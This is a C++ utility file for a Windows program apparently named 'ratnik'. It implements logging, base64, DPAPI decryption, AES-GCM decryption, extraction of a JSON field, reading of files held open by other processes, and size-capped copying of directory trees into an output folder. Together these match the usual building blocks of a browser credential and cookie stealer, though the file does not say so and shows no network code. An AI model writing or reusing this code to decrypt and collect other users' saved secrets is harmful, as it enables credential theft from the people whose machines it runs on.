#include "common.h"
#include <cstdarg>

static FILE* g_log = nullptr;

fs::path LogPath() {
    return OutDir() / "ratnik.log";
}

void Log(const char* fmt, ...) {
    if (!g_log) g_log = _wfopen(LogPath().wstring().c_str(), L"a");
    if (!g_log) return;
    SYSTEMTIME st; GetLocalTime(&st);
    fprintf(g_log, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
    va_list ap; va_start(ap, fmt);
    vfprintf(g_log, fmt, ap);
    va_end(ap);
    fputc('\n', g_log);
    fflush(g_log);
}

void LogClose() {
    if (g_log) { fclose(g_log); g_log = nullptr; }
}

std::wstring Env(const wchar_t* name) {
    wchar_t buf[32768];
    DWORD n = GetEnvironmentVariableW(name, buf, 32768);
    if (!n || n >= 32768) return L"";
    return std::wstring(buf, n);
}

fs::path ExeDir() {
    wchar_t p[MAX_PATH];
    GetModuleFileNameW(nullptr, p, MAX_PATH);
    return fs::path(p).parent_path();
}

fs::path TempDir() {
    wchar_t p[MAX_PATH];
    GetTempPathW(MAX_PATH, p);
    return fs::path(p);
}

fs::path OutDir() {
    wchar_t buf[32768];
    DWORD n = GetEnvironmentVariableW(L"RATNIK_OUT", buf, 32768);
    if (n > 0 && n < 32768) {
        fs::path p(buf);
        std::error_code ec;
        fs::create_directories(p, ec);
        return p;
    }
    return TempDir();
}

std::string ToUtf8(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string s(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), s.data(), n, nullptr, nullptr);
    return s;
}

std::wstring ToWide(const std::string& s) {
    if (s.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    std::wstring w(n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), w.data(), n);
    return w;
}

std::string NowStamp() {
    SYSTEMTIME st; GetLocalTime(&st);
    char b[64];
    sprintf_s(b, "%04d%02d%02d_%02d%02d%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return b;
}

Bytes ReadAll(const fs::path& p) {
    Bytes out;
    HANDLE h = CreateFileW(p.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return out;
    LARGE_INTEGER sz{};
    if (GetFileSizeEx(h, &sz) && sz.QuadPart > 0 && sz.QuadPart < (1ll << 30)) {
        out.resize((size_t)sz.QuadPart);
        DWORD got = 0;
        if (!ReadFile(h, out.data(), (DWORD)out.size(), &got, nullptr)) out.clear();
        else out.resize(got);
    }
    CloseHandle(h);
    return out;
}

bool WriteAll(const fs::path& p, const Bytes& b) {
    std::error_code ec;
    fs::create_directories(p.parent_path(), ec);
    HANDLE h = CreateFileW(p.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD wr = 0;
    bool ok = WriteFile(h, b.data(), (DWORD)b.size(), &wr, nullptr) && wr == b.size();
    CloseHandle(h);
    return ok;
}

static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string Base64Encode(const Bytes& in) {
    std::string out;
    int val = 0, bits = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        bits += 8;
        while (bits >= 0) { out.push_back(B64[(val >> bits) & 0x3F]); bits -= 6; }
    }
    if (bits > -6) out.push_back(B64[((val << 8) >> (bits + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

Bytes Base64Decode(const std::string& in) {
    static int T[256]; static bool init = false;
    if (!init) {
        for (int i = 0; i < 256; i++) T[i] = -1;
        for (int i = 0; i < 64; i++) T[(unsigned char)B64[i]] = i;
        init = true;
    }
    Bytes out;
    int val = 0, bits = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) continue;
        val = (val << 6) + T[c];
        bits += 6;
        if (bits >= 0) { out.push_back((unsigned char)((val >> bits) & 0xFF)); bits -= 8; }
    }
    return out;
}

Bytes DpapiDecrypt(const Bytes& in) {
    if (in.empty()) return {};
    DATA_BLOB din{}, dout{};
    din.cbData = (DWORD)in.size();
    din.pbData = (BYTE*)in.data();
    if (!CryptUnprotectData(&din, nullptr, nullptr, nullptr, nullptr, 0, &dout)) return {};
    Bytes out(dout.pbData, dout.pbData + dout.cbData);
    LocalFree(dout.pbData);
    return out;
}

Bytes AesGcmDecrypt(const Bytes& key, const Bytes& nonce, const Bytes& ct, const Bytes& tag) {
    Bytes out;
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) < 0) return out;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCRYPT_KEY_HANDLE hKey = nullptr;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0) < 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return out;
    }
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PUCHAR)nonce.data();
    info.cbNonce = (ULONG)nonce.size();
    info.pbTag = (PUCHAR)tag.data();
    info.cbTag = (ULONG)tag.size();
    out.resize(ct.size());
    ULONG done = 0;
    NTSTATUS st = BCryptDecrypt(hKey, (PUCHAR)ct.data(), (ULONG)ct.size(), &info, nullptr, 0,
                                out.data(), (ULONG)out.size(), &done, 0);
    if (st < 0) out.clear(); else out.resize(done);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

// naive JSON string extractor: finds "key" then the following quoted value
std::string JsonString(const std::string& json, const std::string& key) {
    std::string pat = "\"" + key + "\"";
    size_t p = json.find(pat);
    if (p == std::string::npos) return {};
    p = json.find(':', p + pat.size());
    if (p == std::string::npos) return {};
    p = json.find('"', p);
    if (p == std::string::npos) return {};
    size_t e = p + 1;
    std::string out;
    while (e < json.size() && json[e] != '"') {
        if (json[e] == '\\' && e + 1 < json.size()) { out.push_back(json[e + 1]); e += 2; continue; }
        out.push_back(json[e]);
        e++;
    }
    return out;
}

bool CopyFileShared(const fs::path& src, const fs::path& dst) {
    Bytes b = ReadAll(src);
    if (b.empty()) return false;
    return WriteAll(dst, b);
}

void CopyTree(const fs::path& src, const fs::path& dst, uint64_t maxBytes) {
    std::error_code ec;
    if (!fs::exists(src, ec)) return;
    uint64_t total = 0;
    for (auto& e : fs::recursive_directory_iterator(src, fs::directory_options::skip_permission_denied, ec)) {
        if (ec) break;
        if (!e.is_regular_file(ec)) continue;
        uint64_t sz = e.file_size(ec);
        if (ec || sz == 0) continue;
        if (total + sz > maxBytes) break;
        fs::path rel = fs::relative(e.path(), src, ec);
        if (ec) continue;
        if (CopyFileShared(e.path(), dst / rel)) total += sz;
    }
}
